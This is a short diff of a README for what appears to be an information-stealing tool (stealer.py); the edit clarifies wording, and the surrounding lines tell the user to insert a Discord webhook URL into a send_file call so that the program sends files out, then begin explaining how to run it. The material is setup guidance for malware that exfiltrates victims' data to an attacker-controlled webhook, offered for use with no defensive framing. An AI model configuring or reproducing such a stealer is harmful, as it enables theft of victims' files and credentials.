@@ -16,7 +16,7 @@ Open `stealer.py` and change this line:
 ```bash
 Discord_Webhook_Client.send_file("WEBHOOK")
 ```
-Remove **WEBHOOK** and add your webhook URL.
+Remove **WEBHOOK** and add your Discord webhook URL.
     
 ## Run the program
 You can run the stealer by doing the following command:
